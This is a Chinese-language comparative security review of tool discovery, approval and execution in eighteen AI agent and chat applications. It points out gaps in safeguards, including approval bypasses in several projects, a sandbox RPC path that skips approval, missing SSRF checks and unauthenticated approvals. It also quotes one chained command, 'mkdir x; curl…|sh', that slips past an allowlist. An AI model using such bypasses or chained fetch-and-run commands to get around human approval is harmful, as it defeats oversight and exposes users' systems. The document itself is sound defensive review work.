# Agent 工具横向调查与对比

> 对比对象：AIO Hub、AstrBot、Chatbox、Cherry Studio、DeepChat、DeepSeek Harness、Hermes Agent、Jan、LobeHub、Manifold Desktop、NextChat、Open WebUI、OpenCode、Pi、Risuai、SillyTavern、VCPChat、VCPToolBox
>
> 对比更新日期：2026-08-27
>
> 依据：同目录十八份单项目调查笔记及其记录的代码快照
>
> 对比方法：只读源码、类型定义、注册表、执行器、调用入口和单项目调查笔记，逐项核对实现
>
> 对比范围：仅统计**模型能够发现、请求并触发执行**的工具，以及相关审批、执行位置、安全边界与扩展入口。纯 UI 功能、消息渲染器、模型供应商本身能力不计入
>
> 文档定位：实现学习与跨项目横向比较，不作为整改方案

## 单项目笔记

| 项目 | 笔记 | 行数 | 分支 | 代码快照 |
| --- | --- | --- | --- | --- |
| AIO Hub | [AIO-Hub-Agent工具调查笔记.md](AIO-Hub-Agent工具调查笔记.md) | 373 | `dev` | `36fbcc6cb5bc9eb7691b3bf9d3e9bd5f3063d3d8` |
| AstrBot | [AstrBot-Agent工具调查笔记.md](AstrBot-Agent工具调查笔记.md) | 317 | `master` | `8ea8ce613a0bee4ddb48b21490afe23418277c75` |
| Chatbox | [Chatbox-Agent工具调查笔记.md](Chatbox-Agent工具调查笔记.md) | 512 | `main` | `81571269addb6bafb589a920b2883f1e1e084fd1` |
| Cherry Studio | [Cherry-Studio-Agent工具调查笔记.md](Cherry-Studio-Agent工具调查笔记.md) | 371 | `main` | `88cfe5dd2b77e63464be22968f66ebcb1d429483` |
| DeepChat | [DeepChat-Agent工具调查笔记.md](DeepChat-Agent工具调查笔记.md) | 164 | `dev` | `7f3379524da3ac629918d35682e38833ad5c203e` |
| DeepSeek Harness | [DeepSeek-Harness-Agent工具调查笔记.md](DeepSeek-Harness-Agent工具调查笔记.md) | 224 | `master` | `b150a551b8d465e31e418e1b2eaf5e79bbb7d28e` |
| Hermes Agent | [Hermes-Agent-Agent工具调查笔记.md](Hermes-Agent-Agent工具调查笔记.md) | 251 | `main` | `791e2ae3257e211d14ca77e654dfe10ee1976a1c` |
| Jan | [Jan-Agent工具调查笔记.md](Jan-Agent工具调查笔记.md) | 190 | `main` | `95e96d02c58ca361a3e54cb36360ed16bc534c8a` |
| LobeHub | [LobeHub-Agent工具调查笔记.md](LobeHub-Agent工具调查笔记.md) | 546 | `canary` | `7c559cbd4d92a54289bce3a8aab96e057d0ce8c5` |
| Manifold Desktop | [Manifold-Desktop-Agent工具调查笔记.md](Manifold-Desktop-Agent工具调查笔记.md) | 75 | `main` | `3d7448fb2e6053056da6d6c126e08f90b94cda4f` |
| NextChat | [NextChat-Agent工具调查笔记.md](NextChat-Agent工具调查笔记.md) | 176 | `main` | `defdcdb55d850cd12c4c657eb83729fd66e215c0` |
| Open WebUI | [Open-WebUI-Agent工具调查笔记.md](Open-WebUI-Agent工具调查笔记.md) | 192 | `main` | `d3e8bf3405e848cfba377814d0aa7ba7290e414d` |
| OpenCode | [OpenCode-Agent工具调查笔记.md](OpenCode-Agent工具调查笔记.md) | 272 | `dev` | `c2eacd72afc4a4984564c393e15ab30011057269` |
| Pi | [Pi-Agent工具调查笔记.md](Pi-Agent工具调查笔记.md) | 136 | `main` | `e86823096c5bad39e1ca282ec24bc5eb9bec745b` |
| Risuai | [Risuai-Agent工具调查笔记.md](Risuai-Agent工具调查笔记.md) | 185 | `main` | `e565563a288ebe4c65b6099a1645ba477d1c84b4` |
| SillyTavern | [SillyTavern-Agent工具调查笔记.md](SillyTavern-Agent工具调查笔记.md) | 384 | `release` | `8172dcd0ee672d3cd9a5e5f7af134f91a45cd2b8` |
| VCPChat | [VCPChat-Agent工具调查笔记.md](VCPChat-Agent工具调查笔记.md) | 315 | `main` | `89e02b778d626078be91dfbad01e5c9554c47f76` |
| VCPToolBox | [VCPToolBox-Agent工具调查笔记.md](VCPToolBox-Agent工具调查笔记.md) | 438 | `main` | `e2762e4dab5c70952d88f96689fba1270624e5ef` |

## 调查方法与比较框架

本文以实际执行代码和类型定义为主要依据，结合注册表、配置 schema、测试及仓库架构文档，梳理各项目当前的工具发现、审批、执行和结果回注行为。静态阅读无法确认的内容明确列入“需进一步验证”，不从描述文本推断运行时保证。

统一比较链路如下：

```text
工具发现/注入
  -> 模型调用表示与解析
  -> 调用归一化与策略判定
  -> 审批、拒绝或自动放行
  -> 执行位置（主进程 / 子进程 / 云端 / 设备 / 浏览器）
  -> 结果限制与回注
  -> MCP、Skill 或 Plugin 扩展边界
```

“原生工具调用”指模型 API 的结构化 tool/function 字段；“文本协议”指模型输出仍为文本、由应用从中解析调用块。表示形式本身不决定安全性，关键在于执行端是否重新校验工具可达性、审批状态、参数范围和权限边界。

## 结论摘要

十八个项目的差异集中在工具是否真正形成执行闭环、目录如何按会话收窄、编排循环由谁驱动、审批绑定强度和执行域。Manifold Desktop 只完成“发现、注入、展示”，不能与其余十七个已有执行回环的项目视为同等工具运行时。其余项目又分为服务端/主进程 Agent 运行时、普通聊天上的工具回环、VCP 文本协议链和本地编码 Agent 等不同形态。可按以下十二条观察：

1. **策略层完整但默认放行面大：LobeHub。** 人工审批状态机 `humanIntervention` 是七个项目里设计最完整的：支持四种模式，API 级规则可覆盖 manifest 级规则，`always` 不会被 auto-run 绕过；但绝大多数内建工具根本不声明该字段，未声明即默认 `never` 自动执行。凭证、浏览器、消息与代理管理四类插件——`lobe-creds` 的凭证保存与注入、`lobe-browser` 的八个 API、`lobe-message` 约 30 个 API（含 `deleteBot`）、`lobe-agent-management` 的 `callAgent`/`installPlugin`——均零声明。
2. **策略层有硬边界，但平台与语义有盲点：Chatbox、Cherry Studio、DeepChat。** 三者都有逐次审批或权限 broker。Chatbox 让计费与应用状态变更类操作不受 `agentFullAccess` 放行；DeepChat 将审批绑定到会话、服务器身份、配置代数、binding hash、execution id 与参数 hash，并设 pending 上限和超时；Cherry Studio 则在 renderer、主进程和 Claude SDK hook 之间串联审批。各自边界分别是 Windows 无 OS 隔离、`acceptEdits` 首词白名单，以及 DeepChat 各工具实际 preflight 与 MCP transport 尚未运行核验。
3. **当前以 VCP 联动，但三者的架构角色不同：AIO Hub、VCPChat、VCPToolBox。** 三者都参与 VCP 文本协议链路，协议两端的解析语义、审批超时方向和鉴权粒度并不一致。AIO 还需要单独评价：它把模型通信表示抽成了 `ToolCallingProtocol`，工具元数据、审批和执行语义没有写死为 VCP；目前只实现并注册了 VCP，不能据此把其工具系统的设计范围归结为"VCP 客户端"。
4. **无逐次审批，信任边界在安装与内容导入：SillyTavern。** 扩展 action 与宿主同权；`/tools-register` 还允许角色卡、World Info 或 Quick Reply 提供工具定义，因此导入内容也可能改变工具面。
5. **执行端与策略端分离、内置 execute_code 沙箱 RPC 旁路的 Python 后端：Hermes。** 工具集中注册表与 `_AGENT_LOOP_TOOLS` 双入口，`resolve_pre_tool_block` 为各分发点唯一审批门（fail-closed），但 `_should_skip_container_guards` 只豁免容器且 `has_host_access=False` 的环境；`execute_code` 的沙箱子进程经 `_rpc_server_loop` 回调父进程线程的 `handle_function_call`，在那里执行已允许的子工具；当 allow-list 与主会话工具面一致时，工具侧不重复走编排层审批。结果持久化有 200K/1500 字符双预算，无内容过滤。
6. **无审批层、无 MCP、本地执行的编码 Agent：Pi。** 工具循环集中在 `agent-loop.ts`，`beforeToolCall` 钩子是唯一拦截点（默认放行）；内置 read/bash/edit/write/grep/find/ls 七工具由 `AgentTool.execute` 在本地进程内执行（bash 走 `spawn` 子进程、进程树终止），项目信任门约束 `.pi` 资源加载而非工具执行。本次未找到 MCP 实现、工具级 token 预算、迭代上限与结果输出侧过滤；`!` 前缀 bash 直通是用户手动旁路，不经过模型工具协议。
7. **执行在 AI SDK 内部、审批与截断在 Effect 层的编码 Agent：OpenCode。** 工具循环全部交给 Vercel AI SDK `streamText` 原生 `tool_calls`（`llm.ts:280-353`），opencode 侧只消费 `fullStream` 事件并持久化 `ToolPart` 状态机；注册过滤按模型/provider/client/flag 组合（GPT-5 系用 `apply_patch`、websearch 仅 opencode provider 或 exa/parallel flag），参数校验统一在 `Tool.wrap` 转 `InvalidArgumentsError` 回注。审批为 allow/ask/deny 三档，`ask` 阻塞在无超时的 Deferred 上；shell 为普通子进程、无沙箱（2 分钟默认超时 + 外部目录检查兜底）；结果统一 2000 行/50KB 截断落盘。TaskTool 是唯一“旁路”形态，但创建子会话时权限收窄（继承父 deny + 强制 todowrite/task deny）且有 `subagent_depth` 限制，与 LobeHub 的 headless 子 agent 方向相反。
8. **目录与循环治理较完整的服务端/主进程运行时：AstrBot、Open WebUI。** AstrBot 把内置、插件、MCP 和 Handoff 归一到 `FunctionTool`，串行执行，具备 30 步默认上限、超时、重复调用守卫和大结果落盘；Open WebUI 汇合 54 个条件内置工具、数据库工具、MCP/OpenAPI、代码解释器与子代理，在服务端循环中限制最大迭代并对结果做引用/图片处理。两者的权限重点都是“谁能使用工具/连接”，不是每次调用的统一人工确认。
9. **AI SDK 工具回环 + 桌面 MCP：Jan。** Web 搜索、RAG 和 MCP 经 `streamText` 汇合，工具集按模型能力与最后一条用户消息裁剪并冻结路由结果；审批有 thread/server/global/allow-all 四级，MCP 执行落在 Rust/Tauri。它没有独立 Agent 规划器，浏览器 MCP 工具被 UI 开关列表过滤但是否仍可调用尚未运行确认。
10. **普通聊天上的轻量回环与未闭合骨架：NextChat、Manifold Desktop。** NextChat 的 OpenAPI 工具使用原生 `tool_calls` 并行执行后递归请求，MCP 则使用 fenced JSON 文本协议；两条链都没有审批、沙箱或步数上限。Manifold Desktop 已能发现 MCP、注入三家 Provider 并展示调用，但 `MCPClient::CallTool()` 无运行时调用点，尚不存在结果回注与下一轮生成。
11. **作用域分层 + 瀑布式执行管线的注册制运行时：DeepSeek Harness。** 工具是注册在内存 registry 的代码对象：`ToolDefinition` 含模型可见 schema、强制 `output` 输出契约与纯函数 `presentCall`/`presentResult`；作用域是全局加每 agent 的层链，restrict 的 allow/deny 只过滤继承面。执行沿固定管线：`tool/call` 落盘 → pre-execute 策略瀑布（ask 经 approval seam 放行，唯一放行结果 allowed-once）→ 单调 guard → execute → post-execute → `tool/result` 落盘，`deriveMessages` 从日志投影模型历史。调度器按 executionMode 分 exclusive 屏障与 parallel 滚动池（默认并发 10）。能力经 capability seam 三角色与工具解耦，bash/pwsh、fs、web、terminal、skill、subagent、MCP 桥等各有 seam，provider 可整体替换而模型可见 schema 不变。
12. **MCP 为唯一工具协议、全量注入零过滤、审批几近缺失的聊天前端：Risuai。** 工具面完全以 MCP 为骨架——模块声明的远程 MCP、内置 internal 客户端、插件 `registerMCP` 与 OpenAI Responses 内置 `web_search_preview` 四类来源，没有独立函数注册表。发现与注入零过滤：主聊天请求不传工具参数，请求入口每请求拉取全部已激活 MCP 的工具注入四类请求体，无模型能力判定、无会话裁剪、无 token 预算、无去重。编排没有统一驱动层：非流式链递归请求函数自身，流式链在流包装器内联续请求，工具串行、未找到任何迭代上限，Claude 流式路径不解析 `tool_use`、是唯一没有工具循环的格式。审批只存在于 `internal:risuai` 13 个写/删工具的执行端，其余工具无任何审批；全部执行在前端上下文，插件工具在 iframe 沙箱内。

当前样本还增加了几个更清晰的执行边界：Cherry Studio 已把 Claude Code、Pi 与 DeepSeek Harness 接入同一会话服务和审批注册表，但三者仍各自维护工具桥；AstrBot 允许工具以空结果结束 Agent，并把后台/定时路径纳入同一轮次上限；Pi 的本地 Shell 在 Windows 优先选择 PowerShell 7；VCPToolBox 的 AgentAssistant 则以 Flowlock 的开始、心跳和终止标记收束委托循环。它们分别说明“共用控制面”“循环收口”“本地执行域”和“协作协议”不能由同一个工具数量指标代替。

## 四个必答问题

判断任一项目前先回答这四问，答案不能从产品宣传或仓库文档取，必须落到实现：

| 项目 | 模型看到什么 | 谁真正执行 | 默认是否需人工 | 已确认的最高风险单点 |
| --- | --- | --- | --- | --- |
| AIO Hub | registry 中 `agentCallable` 方法 + 动态上下文 | Tauri 渲染进程 / Rust 命令 / 远端 VCP 节点 | 可配置，工具级与方法级 | 入向分布式调用仍无统一逐次人工审批门；`internal_request_file` 已接入 aio-file-operator 沙箱/审批区与 Rust 侧复校验（见审计项 ⑧），暴露名单校验仍被跳过 |
| AstrBot | 按请求裁剪的 `ToolSet`（内置、插件、MCP、Handoff） | Python 主进程、MCP server、后台/子 Agent | 非内置工具默认 `member` 即不限制；敏感内置工具自行检查 | 权限默认值偏宽，且内置工具不经过统一 `_PermissionGuardedTool` |
| Chatbox | 按会话组装的 AI SDK ToolSet | 主进程 / MCP 子进程 / 沙箱 / 宿主 shell | 高风险命令与越界写入需批准 | Windows 上 `code_execution` 无 OS 隔离，裸执行 |
| Cherry Studio | MCP server tools + Claude Code 声明式注册表 | Electron 主进程 / MCP 子进程 / SDK 原生二进制 | `default` 模式下 Bash 与写入需批准 | `acceptEdits` 白名单只看首词，`mkdir x; curl…\|sh` 可绕过 |
| DeepChat | 带 fingerprint 的 session tool profile（MCP + Agent 工具） | Electron 主进程内 ToolService；MCP server | `default` 经 broker/命令风险审批；可切 `auto_approve`/`full_access` | `full_access` 可放行模型来源调用；各 MCP transport 隔离未运行确认 |
| DeepSeek Harness | scope 分层注册的 `ToolDefinition`（schema + 强制 output 契约；呈现回调不上模型请求） | 宿主进程内（agent-loop 调度器，exclusive 屏障/parallel 滚动池默认 10）；shell/terminal 经子进程 | 默认自动执行；策略瀑布命中 ask 才经 approval seam 询问，唯一放行结果 `allowed-once`，拒绝/无审批服务即拒绝 | Code Mode `run_code` 保留传输，直接调用在策略管线（pre-execute/审批/guard）之前被终结；approval 的 ACP answerer 与 MCP 桥端到端未运行核验 |
| Hermes Agent | `tools/` 导入注册 + 插件/MCP/Skill 汇入同一 registry，全量注入 | Python 主进程；execute_code 沙箱子进程 | 危险命令需批准（fail-closed），yolo 可跳过 | `execute_code` 沙箱 RPC 旁路直接调 `handle_function_call`，绕过编排层审批链（只受 allow-list 限制） |
| Jan | Web 搜索、RAG 与按路由筛选的 MCP 工具 | AI SDK 循环；MCP 在 Rust/Tauri 侧 | thread/server/global/allow-all 四级；未批准时等待 UI | `Jan Browser MCP` 被工具开关 UI 隐藏，实际模型可达性尚未运行确认 |
| LobeHub | agent mode 的 builtin + connector + MCP | server runtime / cloud gateway / 用户设备 / 本地 MCP | **多数内建工具零声明即自动执行** | MCP HTTP client 无 SSRF 过滤，token 随请求头外泄 |
| Manifold Desktop | 全部已连接 MCP 工具 | 当前只展示调用；`CallTool()` 无运行时调用点 | 不适用：执行回环未接通 | 文档声称有多轮执行，但当前实现止于展示 tool call |
| NextChat | 当前 Mask 的 OpenAPI 插件 + 全局 MCP prompt 目录 | 浏览器 HTTP；桌面 stdio MCP 子进程 | 无逐次审批 | MCP 子进程继承完整 `process.env`，且递归工具请求无步数上限 |
| Open WebUI | 条件内置、DB 工具、MCP/OpenAPI 与子代理 | 服务端 Python、前端 direct/pyodide、Jupyter、外部 server | AccessGrants/能力开关；无统一逐次人工审批 | MCP 客户端默认 `verify=False`；direct/代码解释器跨多个执行域 |
| OpenCode | ToolRegistry（内置/自定义/插件）+ SessionTools 并入 MCP 工具 | node 主进程；shell 为普通子进程；MCP stdio 子进程 | 权限 `ask` 需人工批准，`*:allow` 时自动执行 | `ask` 审批无超时兜底，UI 不响应则永久挂起；shell 无沙箱 |
| Pi | 会话级工具集（内置 7 工具 + 扩展注册），每轮注入 | 本地进程内执行（bash 为 spawn 子进程） | 无逐次审批，`beforeToolCall` 钩子默认放行 | 无 MCP；执行端不二次鉴权，扩展钩子缺失时任何工具直接执行；`!` bash 直通用户权限 |
| Risuai | 每请求全量注入全部已激活 MCP 工具（模块声明的远程 MCP、内置 internal 客户端、插件 registerMCP、Responses 内置 web_search_preview） | 前端 JS 上下文；远程 MCP 桌面经 Tauri Rust 侧 fetch、stdio 为 Tauri 子进程、插件工具在 iframe 沙箱 | 仅 internal:risuai 13 个写/删工具执行端 alertConfirm；其余无审批 | 全量注入零过滤 + 除极少数 internal:risuai 工具外无任何审批；远程 MCP 无 SSRF 过滤、递归无迭代上限 |
| SillyTavern | 扩展注册并适配到 provider 的 function tools | 浏览器前端 extension action | 未发现逐次审批 | 扩展 action 与宿主同权，安装即授权 |
| VCPChat | 上游 `tool_calls` / VCP 文本块 / 自带节点工具 | **自带 `VCPDistributedServer` 子进程**、远端 ToolBox | 审批终端，规则可配得任意宽 | 自带节点在本机执行 PowerShellExecutor 等高危插件 |
| VCPToolBox | 插件 manifest 描述 + 上下文占位符 | Node/Python/native 子进程、分布式节点 | 命中规则才审批，超时拒绝 | 审批响应无身份校验，任何持全局 Key 的连接可批准任意请求 |

## 项目实现概览

### AIO Hub

AIO Hub 的工具系统分成三层：`ToolRegistry` 与 `AgentExtension` 提供能力与动态上下文，发现、审批和执行器处理统一内部对象，`ToolCallingProtocol` 负责模型可见定义、调用解析和结果格式化。当前协议类型和路由只接入 `VcpToolCallingProtocol`，所以实际运行仍是 VCP 文本块；这属于当前实现范围，不是架构边界。稳定定义 `{{tools}}` 与逐轮动态上下文 `{{tool_context}}` 分开注入，执行器在协议解析后还会复核工具、方法和 `agentCallable`。能力来源也不限于内建注册表：动态 factory、JS/Sidecar/Native 插件和远端 VCP proxy 都可汇入同一注册中心。接入 VCP Connector 后，实际权限还取决于远端 ToolBox 或分布式节点；`internal_request_file` 是入向协议义务，不是本机模型可发现的普通工具。

### Chatbox

Chatbox 通过 `buildToolsForSession()` 按 Agent 模式、模型能力、附件、知识库、MCP 和平台动态组装 AI SDK `ToolSet`。stdio MCP 是宿主上的真实子进程，`user_exec` 是真实系统 shell；高风险命令和越界写入可暂停等待批准，应用状态变更与计费类 action 即使开启 `agentFullAccess` 也不能绕过。macOS/Linux 使用 `@anthropic-ai/sandbox-runtime`，Windows 明确没有 OS 级隔离。Skills 是指令与流程文本，不是独立权限沙箱。

### AstrBot

AstrBot 把内置、插件、MCP 与 Handoff 子 Agent 统一成 `FunctionTool`/`ToolSet`。请求构建阶段会按知识库、Web 搜索、persona 与 skills-like 模式裁剪 schema；runner 串行执行同轮调用，默认最多 30 步，并提供超时、用户中断、重复调用提示与 27.5k token 结果落盘。非内置工具经 `_PermissionGuardedTool`，但默认 `member` 不限制；内置工具绕过该统一包装，依靠自身的管理员检查。

### Cherry Studio

Cherry Studio 同时存在通用 `McpRuntimeService` 与 Claude Code Agent 注册表两条工具路径。注册表用 `user`、`internal`、`disabled` 三态控制曝光，并叠加 `disabledTools`、自动批准规则、`canUseTool` 和 hook。审批由 renderer 展示、Electron 主进程持久化并恢复执行；但 Claude Code 的 Bash/Read/Write 最终由 SDK 原生二进制执行，Cherry Studio 处于拦截者而非执行器位置。`acceptEdits` 的首词白名单和不解析 Bash 路径的检查是已确认盲点。

### DeepChat

DeepChat 用 `DeepChatToolResolver` 为会话生成带 fingerprint 的工具 profile，再由 `ToolService` 合并 MCP 与 Agent 工具；同名时保留 MCP 版本。原生 tool call 和 `<function_call>` legacy 文本协议最终都进入 `DeepChatLoopEngine`，默认最多 128 次工具调用。审批记录把会话、服务器身份、配置代数、binding、execution id 与参数 hash 绑定在一起，另有命令风险分级和 workspace 路径检查。`exec`/`process` 使用可配置命令 shell（`posix|cmd|windows-powershell|git-bash`，#2109）；Agent 配置另有三组输出字符数上限字段（#2103，归一化到 1,000–200,000）；MCP 与 Agent 工具分派前统一经 `assertExecutionContractDispatchAllowed` 执行契约门（Tape 契约谱系）；octet-stream 文本文件允许读取（#2110）。

### DeepSeek Harness

DeepSeek Harness 的工具是注册在内存 registry 中的代码对象：`ToolDefinition` 由模型可见 schema、强制 `output` 输出契约、`execute` 与纯函数 `presentCall`/`presentResult` 组成，注册即 effect、可卸载。作用域为全局加每 agent 的层链，restrict 的 allow/deny 以交集过滤继承面，Code Mode 附加 `run_code` 保留传输。执行沿固定管线：`tool/call` 落盘 → pre-execute 瀑布（ask 经 approval 放行）→ 单调 guard → execute → post-execute → `tool/result` 落盘。调度器按 executionMode 分 exclusive 屏障与 parallel 滚动池（默认并发 10）。工具集按包拆分（bash/pwsh、fs、web、terminal、skill、subagent、todo/goal、MCP 桥 `mcp__<server>__<name>` 等），能力经 capability seam 与 provider 解耦。

### Hermes Agent

Hermes 是纯 Python 后端聚合核心，工具面由 `tools/` 目录模块导入注册、`plugins/` 目录插件、MCP 客户端动态发现、`skills/` 与 `optional-skills/` 指令文本四类来源汇入同一 `tools/registry.py` 注册表，经 `get_tool_definitions()` 全量注入每次 API 调用（tools 数组不参与 prompt caching，故工具集刻意保持小而窄）。执行与编排沿 `run_agent.py` → `model_tools.py` → `registry.dispatch` 三层组织，全部在 Python 主进程；`execute_code` 的代码在沙箱子进程，工具调用经 `_rpc_server_loop` 回调父进程线程的 `handle_function_call`。审批是 CLI 交互（fail-closed），`resolve_pre_tool_block` 是各分发点唯一审批门；`HERMES_YOLO_MODE` 或会话 yolo 可跳过审批。agent-level 工具（`todo`/`memory`/`session_search`/`delegate_task`）由 `_AGENT_LOOP_TOOLS` 特判拦截，不进注册表分发。

### Jan

Jan 的工具面由 Web 搜索、RAG 与 MCP 三类组成，只有模型声明 tools capability 时才加载。智能路由按最后一条用户消息筛选 MCP 工具，并用签名冻结结果以保持提示缓存稳定；schema 在送入 AI SDK 前会为 Rust/GBNF 做规整。工具循环由 `streamText` 驱动，MCP 实际执行在 Rust/Tauri 侧，审批有 thread、server、global 与 allow-all 四层持久化范围。

### LobeHub

LobeHub 将工具可见性、执行位置和人工审批拆成独立链路。builtin、connector 和 MCP 工具可在 server、cloud gateway、用户设备或桌面本地运行；`humanIntervention` 支持多种模式，API 级规则覆盖 manifest 级规则，`always` 不会被 auto-run 绕过。机制完整不等于默认严格：多数内建工具未声明该字段，未声明即 `never` 自动执行，子 Agent 的 `headless` 路径还会跳过人工审批。

### Manifold Desktop

Manifold Desktop 目前只有 MCP 工具发现、schema 注入和 tool call 展示。`MCPClient::CallTool()`、`ToolResult` 与 `maxToolCallRounds` 虽已存在，但主聊天链没有调用执行器，也没有把结果追加后重新请求模型；插件 `RegisterTool` 同样只是接口骨架。因此它应标记为“执行闭环未实现”，不能因为 Provider 能解析 tool call 就计作完整 Agent 工具运行时。

### NextChat

NextChat 在普通聊天上并列两条链：OpenAPI operation 转成原生 `tool_calls`，浏览器并行请求外部 endpoint 并递归续写；MCP 工具描述进入 system prompt，模型输出 `json:mcp:<clientId>` fenced block 后由桌面 stdio client 执行。两条链协议、回注 role 与选择范围都不同，且没有统一审批、沙箱或 Agent 步数上限。

### Open WebUI

Open WebUI 在服务端 `middleware.py` 汇合条件内置工具、数据库 Python 工具、MCP/OpenAPI server、代码解释器和子代理。内置 54 个函数按模型 meta、全局配置、模型能力与用户权限四重筛选；循环受 `max_tool_call_iterations` 限制，结果支持引用提取、base64 图片拆分和 HTML embed。执行域覆盖服务端、前端 direct/pyodide、Jupyter 与外部服务器，权限以 AccessGrants 和连接授权为主。

### Pi

Pi 是本地编码 Agent，工具循环内置在 `packages/agent/src/agent-loop.ts`。工具定义统一为“name + description + TypeBox parameters + execute”，内置 read/bash/edit/write/grep/find/ls 七个，扩展经 `registerTool` 的 `ToolDefinition` 注册（含 prompt snippet、渲染回调、`executionMode` 串/并行）。每轮注入阶段把会话级激活集写入请求上下文；模型返回 `toolCall` 块后，循环在 `prepareToolCall` 里查找工具并做 TypeBox 校验（失败转 isError 结果回注），`beforeToolCall` 钩子（由扩展的 `tool_call` 事件挂载）可拦截执行，随后在本地进程内运行。默认并行执行、结果按序回注；`stopReason === "length"` 时整批工具调用按失败处理。没有 MCP 客户端、没有逐次审批 UI、没有工具级 token 预算或迭代上限；隔离完全依赖运行环境（README 文档给出容器化三种模式），与 VCPToolBox/Chatbox 的策略层形态不在同一层。

### OpenCode

OpenCode 是 Effect 服务化的编码 Agent，工具循环整体让渡给 Vercel AI SDK 的 `streamText`（`llm.ts:318`）：工具选择、执行与结果回注都由 SDK 承担，opencode 侧只消费 fullStream 事件并持久化 ToolPart 状态机。审批为 allow/ask/deny 三档，ask 阻塞在无超时的 Deferred 上等待 UI 回复。执行全部在 node 主进程内：shell 为普通子进程，无 pty、无沙箱，默认 2 分钟超时外加 `external_directory` 检查兜底；MCP stdio 服务器退出时递归杀进程树。结果统一按默认 2000 行/50KB 截断并落盘 `tool-output/`。注册来源、过滤组合与参数校验细节见 [OpenCode-Agent工具调查笔记.md](OpenCode-Agent工具调查笔记.md)。

### Risuai

Risuai 的工具面完全以 MCP 为骨架，没有独立函数注册表：模块声明的远程 MCP、内置 internal 客户端、插件 `registerMCP` 模块与 OpenAI Responses 内置搜索四类来源汇入同一 MCP 注册表。发现与注入零过滤：主聊天请求不传工具参数，请求入口每请求拉取全部已激活 MCP 的工具注入四类请求体，无模型能力判定、无会话裁剪、无 token 预算、无去重。模型协议是各家原生结构化字段，应用自有的 `<tool_call>` 标签只做持久化：调用与结果按 ID 存入 localforage，消息文本留引用，下一轮解码还原。编排无统一驱动层：非流式链递归请求函数，流式链在流包装器内联续请求，工具串行、无迭代上限；Claude 流式路径不处理工具调用，是唯一没有工具循环的格式。审批只存在于 `internal:risuai` 13 个写/删工具的执行端，拒绝返回 "Access denied by user." 文本；其余工具无任何审批。所有工具在前端上下文执行：远程 MCP 桌面经 Tauri Rust 侧 fetch、stdio 为 Tauri 子进程、插件工具在 iframe 沙箱。

### SillyTavern

SillyTavern 的 `ToolManager` 将多家 provider 的 function calling 归一化到浏览器侧 action，按返回顺序串行执行并最多递归五轮。核心没有逐次审批或工具级沙箱，扩展 action 与宿主同权。信任边界也不只在扩展安装：`/tools-register` 允许角色卡、World Info 或 Quick Reply 中的 STscript closure 定义模型工具，使“导入内容”也可能改变工具面。

### VCPChat

VCPChat 既是审批终端，也随包携带并默认启用 `VCPDistributedServer` 子进程，因此整个应用确实会在本机执行 PowerShellExecutor、FileOperator、ScreenPilot 等插件。自动允许规则可以配置得任意宽，审批 WebSocket 只有连接级鉴权；`DESKTOP_PUSH` 还允许模型输出绕过常规审批协议，在桌面画布执行 HTML 与 JavaScript。

### VCPToolBox

VCPToolBox 负责 VCP 文本解析、插件执行、分布式转发和审批状态。插件可通过 Node、Python、native、stdio、direct 或 distributed 路径运行；框架没有统一沙箱，`requiresAdmin` 也不是框架强制点。它的解析器不保护 Markdown code fence，并可用 `fuzzyToolMatching` 放宽语法；审批超时会拒绝，但审批响应没有身份绑定，异步 `/plugin-callback` 也缺少鉴权。

## 横向矩阵

### 工具发现与注入

| 项目 | 发现机制 | 注入形态 | 按会话/模式收窄 |
| --- | --- | --- | --- |
| AIO Hub | 统一 registry 运行期反射 `getMetadata()`，来源可为内建、factory、插件代理或 VCP proxy；筛 `agentCallable === true` | 由 `ToolCallingProtocol` 生成；当前是 system prompt 中的 VCP 定义，`{{tools}}` 与 `{{tool_context}}` 分离 | 单 Agent 的 toggle |
| AstrBot | `ToolSet` 汇合内置装饰器、插件、MCP 与 Handoff；同状态后注册覆盖、active 优先 | OpenAI/Anthropic/Gemini 三类原生 schema；skills-like 可首轮只发轻量定义 | 按知识库、Web 搜索、persona、启停状态与请求分支重建 |
| Chatbox | `buildToolsForSession()` 单一构造点 | 原生 tools 字段 | agentMode、模型能力、附件、知识库、MCP、平台 |
| Cherry Studio | MCP runtime 同步 + 声明式注册表的 `exposure` 三态 | 原生 tools / SDK `query()` 参数 | `scope.mcpToolIds`、环境依赖条件 |
| DeepChat | session tool profile 合并 MCP 与 AgentToolManager，MCP 同名优先 | 原生 tools；不支持时用 `<function_call>` legacy 文本协议 | Agent policy、projectDir、Skill、MCP server、disabled tools、subagent capability |
| DeepSeek Harness | ToolRuntime registry 注册即 effect：内置工具包、动态插件与 MCP 运行时发现 | 原生 tools 数组随 PromptAssembly 注入请求头；schema 白名单只含 name/description/parameters | scope 层链投影（全局+agent 层），restrict allow/deny 交集过滤继承面；Code Mode 按 native/code/both 裁剪 |
| Hermes Agent | `tools/` 模块导入时 `registry.register()`；插件/MCP/Skill/toolset 四来源汇入同一 registry | 全量 tools 数组随每次 API 调用注入（tools 不进 prompt cache，故工具集保持小而窄） | `enabled_tools`/`enabled_toolsets` 白黑名单、check_fn 30s TTL 探针缓存、`dynamic_schema_overrides` |
| Jan | Web 搜索、RAG、MCP；智能路由按用户消息选相关工具并冻结签名 | 原生 tools 字段（AI SDK `streamText`） | 模型 capability、文档/RAG 状态、禁用复合 key、智能路由结果 |
| LobeHub | builtin registry + connector + manifest | 原生 tools 字段 | agent/chat mode 白名单、设备在线状态、用户启用 |
| Manifold Desktop | 已连接 MCP server 的 `tools/list` 全量聚合；同名后连接覆盖 | 原生 Provider tools schema | 常规聊天全量；Compare 路径不注入；无执行回环 |
| NextChat | 当前 Mask 选择的 OpenAPI operation；全局已连接 MCP server | OpenAPI 走原生 tools；MCP 描述拼入 system prompt | OpenAPI 按 `Mask.plugin`；MCP 按全局开关和活跃 server |
| Open WebUI | 54 个条件内置 + DB Python 工具 + MCP/OpenAPI server | 原生 tools/function-call items；direct 工具转前端事件 | 模型 meta、全局配置、模型能力、用户权限、AccessGrants 与连接过滤 |
| OpenCode | ToolRegistry 六路来源：内置（16+1）、自定义 `{tool,tools}/*.js\|ts`、插件 `tool` hook、MCP、MCP 资源工具、Skill | 原生 tools 字段（AI SDK `streamText`） | 按模型家族（apply_patch/edit/write）、provider（websearch）、client（question）与实验 flag（lsp/plan/execute）；权限全量禁用集合；prompt `user.tools` 显式禁用 |
| Pi | 内置工具工厂 + 扩展 `registerTool` 注册表；无 MCP | 原生 tools 字段（每轮注入当前工具集） | 会话级激活集（`setActiveToolsByName`），system prompt 只列带 snippet 的工具 |
